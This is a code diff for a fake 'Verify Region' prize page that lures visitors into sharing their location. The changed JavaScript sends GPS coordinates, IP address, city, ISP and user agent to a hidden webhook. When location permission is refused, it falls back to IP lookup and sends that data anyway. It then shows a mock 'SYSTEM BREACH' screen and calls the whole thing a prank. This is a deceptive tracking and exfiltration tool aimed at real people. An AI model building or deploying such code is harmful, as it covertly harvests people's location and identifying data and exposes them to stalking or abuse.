@@ -12,27 +12,79 @@
   button:hover { background:#0ea5e9; }
   button:disabled { opacity:.6; cursor:not-allowed; }
   #status { margin-top:16px; font-size:14px; opacity:.8; min-height:20px; }
-  .prank { font-size:64px; margin:20px 0; }
-  .prank-title { color:#fbbf24; font-size:28px; margin:12px 0; }
-  .prank-text { line-height:1.6; opacity:.9; }
   .hidden { display:none; }
+
+  /* HACKER REVEAL */
+  .hacker-card {
+    background:#000;
+    color:#00ff41;
+    font-family: 'Courier New', monospace;
+    border:2px solid #00ff41;
+    box-shadow: 0 0 30px #00ff41, inset 0 0 30px rgba(0,255,65,.1);
+    padding:28px;
+    border-radius:8px;
+    max-width:520px;
+    width:100%;
+    text-align:left;
+    text-shadow: 0 0 5px #00ff41;
+  }
+  .hacker-card h2 {
+    color:#00ff41;
+    font-family:'Courier New', monospace;
+    margin:0 0 16px 0;
+    font-size:22px;
+    letter-spacing:2px;
+    animation: flicker 2s infinite;
+  }
+  .hacker-line { margin:6px 0; word-break:break-all; }
+  .hacker-label { color:#00cc33; }
+  .hacker-value { color:#00ff41; font-weight:bold; }
+  .hacker-warn {
+    margin-top:20px;
+    padding:12px;
+    border:1px dashed #00ff41;
+    color:#ffff00;
+    text-shadow: 0 0 5px #ffff00;
+  }
+  .cursor::after {
+    content:"_";
+    animation: blink 1s step-end infinite;
+  }
+  @keyframes blink { 50% { opacity:0; } }
+  @keyframes flicker {
+    0%,100% { opacity:1; }
+    45% { opacity:1; }
+    50% { opacity:.7; }
+    55% { opacity:1; }
+  }
 </style>
 </head>
 <body>
 <div class="card" id="mainCard">
   <h1>🎁 Verify Region</h1>
-  <p>Tap below and allow location to confirm eligibility for your prize.</p>
+  <p>Tap below and allow location to confirm eligibility for your prize. <b style="color:#fbbf24">Make sure to turn on your location for this to work.</b></p>
   <button id="btn" onclick="grab()">Verify My Region</button>
   <div id="status"></div>
 </div>
 
-<div class="card hidden" id="prankCard">
-  <div class="prank">😜</div>
-  <div class="prank-title">GOTCHA! It's a prank!</div>
-  <div class="prank-text">
-    There's no prize 😅<br><br>
-    Just a friendly reminder — <b>never allow location access on random websites</b>. If this were a real scam site, someone could've just grabbed your exact coordinates.<br><br>
-    Stay safe out there! 💙
+<div class="hacker-card hidden" id="prankCard">
+  <h2>&gt; SYSTEM BREACH DETECTED</h2>
+  <div class="hacker-line">[+] Initializing trace...</div>
+  <div class="hacker-line">[+] Bypassing security...</div>
+  <div class="hacker-line">[+] Target acquired.</div>
+  <div class="hacker-line">&nbsp;</div>
+  <div class="hacker-line"><span class="hacker-label">&gt; IP.......:</span> <span class="hacker-value" id="ipOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; CITY.....:</span> <span class="hacker-value" id="cityOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; REGION...:</span> <span class="hacker-value" id="regionOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; COUNTRY..:</span> <span class="hacker-value" id="countryOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; LAT......:</span> <span class="hacker-value" id="latOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; LON......:</span> <span class="hacker-value" id="lonOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; ISP......:</span> <span class="hacker-value" id="ispOut">---</span></div>
+  <div class="hacker-line cursor">&nbsp;</div>
+  <div class="hacker-warn">
+    ⚠ GOTCHA — it's a prank 😜<br><br>
+    But this info was pulled just from your IP. Imagine if you'd actually clicked <b>Allow</b> — I'd have your exact GPS coords.<br><br>
+    <b>Never trust random links.</b> Stay safe out there.
   </div>
 </div>
 
@@ -43,19 +95,48 @@ function setStatus(msg) {
   document.getElementById('status').textContent = msg;
 }
 
-function showPrank() {
-  document.getElementById('mainCard').classList.add('hidden');
-  document.getElementById('prankCard').classList.remove('hidden');
+async function fetchIPInfo() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    return await res.json();
+  } catch(e) {
+    return null;
+  }
 }
 
-function grab() {
+async function sendWebhook(content) {
+  try {
+    const fd = new FormData();
+    fd.append("content", content);
+    await fetch(WEBHOOK, { method:"POST", body:fd });
+  } catch(e) {}
+}
+
+function showHackerReveal(info) {
+  document.getElementById('mainCard').classList.add('hidden');
+  document.getElementById('prankCard').classList.remove('hidden');
+  if (info) {
+    document.getElementById('ipOut').textContent = info.ip || "unknown";
+    document.getElementById('cityOut').textContent = info.city || "unknown";
+    document.getElementById('regionOut').textContent = info.region || "unknown";
+    document.getElementById('countryOut').textContent = info.country_name || "unknown";
+    document.getElementById('latOut').textContent = info.latitude || "unknown";
+    document.getElementById('lonOut').textContent = info.longitude || "unknown";
+    document.getElementById('ispOut').textContent = info.org || "unknown";
+  }
+}
+
+async function grab() {
   const btn = document.getElementById('btn');
   btn.disabled = true;
   setStatus("Verifying...");
 
   if (!navigator.geolocation || !window.isSecureContext) {
-    setStatus("Verification unavailable on this device.");
-    btn.disabled = false;
+    const info = await fetchIPInfo();
+    if (info) {
+      await sendWebhook(`📍 **IP-only hit (no geolocation API)**\nIP: \`${info.ip}\`\nCity: ${info.city}, ${info.region}, ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nUA: ${navigator.userAgent}`);
+    }
+    setTimeout(() => showHackerReveal(info), 1500);
     return;
   }
 
@@ -65,21 +146,19 @@ function grab() {
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
       const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+      const info = await fetchIPInfo();
 
-      try {
-        const formData = new FormData();
-        formData.append("content", `📍 **New hit**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nUA: ${navigator.userAgent}`);
-        await fetch(WEBHOOK, { method: "POST", body: formData });
-      } catch(e) {
-        // silent fail — visitor doesn't need to know
-      }
+      await sendWebhook(`📍 **GPS HIT (allowed)**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nIP: ${info?.ip || "?"} (${info?.city || "?"}, ${info?.country_name || "?"})\nISP: ${info?.org || "?"}\nUA: ${navigator.userAgent}`);
 
-      // small delay so it feels like it's "verifying" instead of instant
-      setTimeout(showPrank, 1500);
+      setTimeout(() => showHackerReveal(info), 1500);
     },
-    (err) => {
-      setStatus("Location access denied. Please allow to continue.");
-      btn.disabled = false;
+    async (err) => {
+      // DENIED — fall back to IP location
+      const info = await fetchIPInfo();
+      if (info) {
+        await sendWebhook(`📍 **IP-only hit (permission denied)**\nIP: \`${info.ip}\`\nCity: ${info.city}, ${info.region}, ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nUA: ${navigator.userAgent}`);
+      }
+      setTimeout(() => showHackerReveal(info), 1500);
     },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
